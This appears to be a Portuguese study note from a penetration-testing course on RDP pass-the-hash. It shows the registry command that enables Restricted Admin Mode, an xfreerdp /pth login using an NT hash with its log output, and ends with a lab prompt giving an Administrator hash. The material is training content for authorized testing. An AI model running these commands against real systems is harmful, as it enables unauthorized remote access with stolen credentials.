#protocolo #hacking 

# RDP Pass-the-Hash (PtH)

Podemos querer acessar aplicativos ou softwares instalados no sistema Windows de um usuário que só estão disponíveis com acesso GUI durante um teste de penetração. Se tivermos credenciais de texto simples para o usuário alvo, não haverá problema para o RDP entrar no sistema. No entanto, e se tivermos apenas o hash NT do usuário obtido de um ataque de despejo de credenciais, como o banco de dados [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) , e não pudermos quebrar o hash para revelar a senha em texto simples? Em alguns casos, podemos realizar um ataque RDP PtH para obter acesso GUI ao sistema de destino usando ferramentas como `xfreerdp`.

Existem algumas advertências para este ataque:

- `Restricted Admin Mode`, que está desabilitado por padrão, deve estar habilitado no host de destino; caso contrário, receberemos o seguinte erro:

![[rdp_session-4.webp]]

Isso pode ser habilitado adicionando uma nova chave de registro `DisableRestrictedAdmin`(REG_DWORD) em `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`. Isso pode ser feito usando o seguinte comando:

## Adicionando a chave de registro DisableRestrictedAdmin

```cmd
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![[rdp_session-5.webp]]

Depois que a chave de registro for adicionada, podemos usar `xfreerdp` com a opção `/pth`para obter acesso RDP:

```shell-session
NycolasES6@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>
```

Se funcionar, agora estaremos logados via RDP como usuário alvo, sem saber sua senha em texto simples.

![[Pasted image 20240502095211.jpg]]

















We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.

User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824